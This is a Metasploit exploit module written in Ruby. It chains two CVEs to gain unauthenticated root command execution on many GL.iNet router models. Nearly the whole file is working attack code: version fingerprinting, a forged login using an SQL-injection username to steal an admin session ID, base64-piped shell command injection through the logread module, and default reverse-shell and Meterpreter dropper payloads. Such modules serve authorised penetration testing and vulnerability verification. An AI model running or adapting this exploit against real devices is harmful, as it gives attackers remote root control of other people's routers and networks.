##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GL.iNet Unauthenticated Remote Command Execution via the logread module.',
        'Description' => %q{
          A command injection vulnerability exists in multiple GL.iNet network products, allowing an attacker
          to inject and execute arbitrary shell commands via JSON parameters at the `gl_system_log` and `gl_crash_log`
          interface in the `logread` module.
          This exploit requires post-authentication using the `Admin-Token` cookie/sessionID (`SID`), typically stolen
          by the attacker.
          However, by chaining this exploit with vulnerability CVE-2023-50919, one can bypass the Nginx authentication
          through a `Lua` string pattern matching and SQL injection vulnerability. The `Admin-Token` cookie/`SID` can be
          retrieved without knowing a valid username and password.

          The following GL.iNet network products are vulnerable:
          - A1300, AX1800, AXT1800, MT3000, MT2500/MT2500A: v4.0.0 < v4.5.0;
          - MT6000: v4.5.0 - v4.5.3;
          - MT1300, MT300N-V2, AR750S, AR750, AR300M, AP1300, B1300: v4.3.7;
          - E750/E750V2, MV1000: v4.3.8;
          - X3000: v4.0.0 - v4.4.2;
          - XE3000: v4.0.0 - v4.4.3;
          - SFT1200: v4.3.6;
          - and potentially others (just try ;-)

          NOTE: Staged Meterpreter payloads might core dump on the target, so use stage-less meterpreter payloads
          when using the Linux Dropper target.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Unknown', # Discovery of the vulnerability CVE-2023-50445
          'DZONERZY' # Discovery of the vulnerability CVE-2023-50919

        ],
        'References' => [
          ['CVE', '2023-50445'],
          ['CVE', '2023-50919'],
          ['URL', 'https://attackerkb.com/topics/3LmJ0d7rzC/cve-2023-50445'],
          ['URL', 'https://attackerkb.com/topics/LdqSuqHKOj/cve-2023-50919'],
          ['URL', 'https://libdzonerzy.so/articles/from-zero-to-botnet-glinet.html'],
          ['URL', 'https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Using%20Shell%20Metacharacter%20Injection%20via%20API.md']
        ],
        'DisclosureDate' => '2023-12-10',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_MIPSLE, ARCH_MIPSBE, ARCH_ARMLE, ARCH_AARCH64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_MIPSLE, ARCH_MIPSBE, ARCH_ARMLE, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['curl', 'wget', 'echo', 'printf', 'bourne'],
              'Linemax' => 900,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('SID', [false, 'Session ID'])
    ])
  end

  def vuln_version?
    @glinet = { 'model' => nil, 'firmware' => nil, 'arch' => nil }
    # check first with version 4.x api call
    post_data = {
      jsonrpc: '2.0',
      id: rand(1000..9999),
      method: 'call',
      params: [
        '',
        'ui',
        'check_initialized',
        {}
      ]
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'text/json',
      'uri' => normalize_uri(target_uri.path, 'rpc'),
      'data' => post_data.to_s
    })
    if res && res.code == 200 && res.body.include?('result')
      res_json = res.get_json_document
      unless res_json.blank?
        @glinet['model'] = res_json['result']['model']
        @glinet['firmware'] = res_json['result']['firmware_version']
      end
    else
      # check with version 3.x api call. These versions are NOT vulnerable
      res = send_request_cgi({
        'method' => 'GET',
        'ctype' => 'application/x-www-form-urlencoded',
        'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'api', 'router', 'hello')
      })
      if res && res.code == 200 && res.body.include?('model') && res.body.include?('version')
        res_json = res.get_json_document
        unless res_json.blank?
          @glinet['model'] = res_json['model']
          @glinet['firmware'] = res_json['version']
        end
      end
    end

    # check for the vulnerable models and firmware versions
    case @glinet['model']
    when 'sft1200'
      @glinet['arch'] = 'mipsle'
      return Rex::Version.new(@glinet['firmware']) == Rex::Version.new('4.3.6')
    when 'ar750', 'ar750s', 'ar300m', 'ar300m16'
      @glinet['arch'] = 'mipsbe'
      return Rex::Version.new(@glinet['firmware']) == Rex::Version.new('4.3.7')
    when 'mt300n-v2', 'mt1300'
      @glinet['arch'] = 'mipsle'
      return Rex::Version.new(@glinet['firmware']) == Rex::Version.new('4.3.7')
    when 'ap1300', 'b1300'
      @glinet['arch'] = 'armle'
      return Rex::Version.new(@glinet['firmware']) == Rex::Version.new('4.3.7')
    when 'e750', 'e750v2'
      @glinet['arch'] = 'mipsbe'
      return Rex::Version.new(@glinet['firmware']) == Rex::Version.new('4.3.8')
    when 'mv1000'
      @glinet['arch'] = 'armle'
      return Rex::Version.new(@glinet['firmware']) == Rex::Version.new('4.3.8')
    when 'ax1800', 'axt1800', 'a1300'
      @glinet['arch'] = 'armle'
      return Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.0.0') && Rex::Version.new(@glinet['firmware']) < Rex::Version.new('4.5.0')
    when 'mt2500', 'mt2500a', 'mt3000'
      @glinet['arch'] = 'aarch64'
      return Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.0.0') && Rex::Version.new(@glinet['firmware']) < Rex::Version.new('4.5.0')
    when 'mt6000'
      @glinet['arch'] = 'aarch64'
      return Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.5.0') && Rex::Version.new(@glinet['firmware']) <= Rex::Version.new('4.5.3')
    when 'x3000'
      @glinet['arch'] = 'aarch64'
      return Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.0.0') && Rex::Version.new(@glinet['firmware']) <= Rex::Version.new('4.4.2')
    when 'xe3000'
      @glinet['arch'] = 'aarch64'
      return Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.0.0') && Rex::Version.new(@glinet['firmware']) <= Rex::Version.new('4.4.3')
    end
    @glinet['arch'] = 'n/a'
    return false
  end

  def auth_bypass
    # Check if datastore['SID'] is set
    return datastore['SID'] unless datastore['SID'].blank?

    # Exploit CVE-2023-50919 to retrieve the SID without valid username and password.
    # Send an RPC request calling the challenge method, which will return a random nonce,
    # the selected root user’s salt, and the crypt’s algorithm to hash the password.
    post_data = {
      jsonrpc: '2.0',
      id: rand(1000..9999),
      method: 'challenge',
      params: {
        username: 'root'
      }
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'text/json',
      'uri' => normalize_uri(target_uri.path, 'rpc'),
      'data' => post_data.to_s
    })
    if res && res.code == 200 && res.body.include?('nonce')
      res_json = res.get_json_document
      unless res_json.blank?
        nonce = res_json['result']['nonce']
      end
    else
      fail_with(Failure::NotFound, 'Getting the random nonce failed.')
    end
    # Perform REGEX to lookup uid field from /etc/shadow to be used as password with manipulated root username
    # Use the SQL injection part to lookup the ACLs for root stored in sqlite db
    # Create the password hash which is the md5 of the concatenation of the user, password, and the retrieved nonce
    username = "roo[^'union selecT char(114,111,111,116)--]:[^:]+:[^:]+"
    pw = '0'
    hash = Digest::MD5.hexdigest("#{username}:#{pw}:#{nonce}")

    # Login with the password hash and obtain the SessionID (SID)
    post_data = {
      jsonrpc: '2.0',
      id: rand(1000..9999),
      method: 'login',
      params: {
        username: username.to_s,
        hash: hash.to_s
      }
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'text/json',
      'uri' => normalize_uri(target_uri.path, 'rpc'),
      'data' => post_data.to_s
    })
    if res && res.code == 200 && res.body.include?('sid')
      res_json = res.get_json_document
      unless res_json.blank?
        sid = res_json['result']['sid']
      end
    else
      fail_with(Failure::NotFound, 'Retrieving the SessionID (SID) failed.')
    end
    return sid
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    cmd = "echo #{payload}|openssl enc -base64 -d -A|sh"
    post_data = {
      jsonrpc: '2.0',
      id: rand(1000..9999),
      method: 'call',
      params: [
        @sid.to_s,
        'logread',
        'get_system_log',
        {
          lines: '',
          module: "|#{cmd}"
        }
      ]
    }.to_json

    return send_request_cgi({
      'method' => 'POST',
      'ctype' => 'text/json',
      'cookie' => "Admin-Token=#{@sid}",
      'uri' => normalize_uri(target_uri.path, 'rpc'),
      'data' => post_data.to_s
    })
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    # Check if target is a GL.iNet network device and the firmware version is vulnerable
    return CheckCode::Vulnerable("Product info: #{@glinet['model']}|#{@glinet['firmware']}|#{@glinet['arch']}") if vuln_version?

    unless @glinet['firmware'].nil?
      # GL.iNet network devices with firmware version 3.x that are safe from this exploit
      return CheckCode::Safe("Product info: #{@glinet['model']}|#{@glinet['firmware']}|#{@glinet['arch']}") if Rex::Version.new(@glinet['firmware']) < Rex::Version.new('4.0.0')

      # GL.iNet network devices with a firmware version 4.x or higher which still could be vulnerable unless the architecture is not available (n/a)
      if @glinet['arch'] != 'n/a' && (Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.0.0'))
        return CheckCode::Safe("Product info: #{@glinet['model']}|#{@glinet['firmware']}|#{@glinet['arch']}")
      end
      return CheckCode::Detected("Product info: #{@glinet['model']}|#{@glinet['firmware']}|#{@glinet['arch']}") if Rex::Version.new(@glinet['firmware']) >= Rex::Version.new('4.0.0')
    end
    # No GL.iNet network device or not reachable
    CheckCode::Unknown('No GL.iNet network device or device is not responding.')
  end

  def exploit
    @sid = auth_bypass
    print_status("SID: #{@sid}")
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
